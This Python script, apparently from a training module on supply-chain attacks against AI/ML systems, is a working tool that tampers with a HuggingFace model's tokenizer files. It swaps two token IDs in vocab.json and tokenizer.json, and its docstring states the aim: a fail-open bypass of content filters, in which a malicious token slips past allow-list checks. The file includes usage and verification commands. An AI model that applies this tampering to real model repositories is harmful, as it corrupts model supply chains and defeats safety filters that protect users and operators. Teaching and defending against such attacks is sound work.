#!/usr/bin/env python3
"""
Script: tokenizer_swap.py
Module: 08 — Supply Chain Attacks on AI/ML Systems
Purpose: Swap two token IDs in vocab.json and tokenizer.json to cause fail-open content filter bypass
Usage: python3 tokenizer_swap.py <model_dir> <token_A> <token_B>
Target: HuggingFace-format model repos using fast tokenizer (tokenizer.json)
Notes: Both vocab.json AND tokenizer.json must be updated — fast tokenizer ignores vocab.json alone
"""

import json
import sys
import os
import shutil
from datetime import datetime

def swap_tokens(model_dir: str, token_a: str, token_b: str):
    """
    Swap token IDs for token_a and token_b in both vocab.json and tokenizer.json.
    Effect: Application logic that maps decoded token strings to allow-lists will
    see token_a where token_b was and vice versa — causing content filter bypass
    when MALICIOUS token maps to FUNICIOUS ID (which passes allow-list checks).
    """
    vocab_path = os.path.join(model_dir, "vocab.json")
    tok_path   = os.path.join(model_dir, "tokenizer.json")

    # Backup originals
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    shutil.copy(vocab_path, vocab_path + f".bak_{ts}")
    shutil.copy(tok_path,   tok_path   + f".bak_{ts}")
    print(f"[+] Backups saved: {vocab_path}.bak_{ts}, {tok_path}.bak_{ts}")

    # --- vocab.json ---
    with open(vocab_path) as f:
        vocab = json.load(f)

    if token_a not in vocab or token_b not in vocab:
        print(f"[!] ERROR: Tokens not found. Available sample: {list(vocab.keys())[:10]}")
        sys.exit(1)

    id_a, id_b = vocab[token_a], vocab[token_b]
    print(f"[+] vocab.json: {token_a}={id_a} ↔ {token_b}={id_b}")
    vocab[token_a], vocab[token_b] = id_b, id_a

    with open(vocab_path, "w") as f:
        json.dump(vocab, f)
    print(f"[+] vocab.json updated")

    # --- tokenizer.json (fast tokenizer — this is what AutoTokenizer uses) ---
    with open(tok_path) as f:
        tok = json.load(f)

    model_vocab = tok["model"]["vocab"]
    if token_a not in model_vocab or token_b not in model_vocab:
        print(f"[!] ERROR: Tokens not found in tokenizer.json model.vocab")
        sys.exit(1)

    tid_a, tid_b = model_vocab[token_a], model_vocab[token_b]
    print(f"[+] tokenizer.json: {token_a}={tid_a} ↔ {token_b}={tid_b}")
    model_vocab[token_a], model_vocab[token_b] = tid_b, tid_a

    with open(tok_path, "w") as f:
        json.dump(tok, f)
    print(f"[+] tokenizer.json updated")

    print(f"\n[+] Done. Verify with:")
    print(f"    python3 -c \"import json; v=json.load(open('{vocab_path}')); print(v['{token_a}'], v['{token_b}'])\"")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <model_dir> <token_A> <token_B>")
        print(f"  Example: {sys.argv[0]} ./model_dir MAL FUN")
        sys.exit(1)
    swap_tokens(sys.argv[1], sys.argv[2], sys.argv[3])
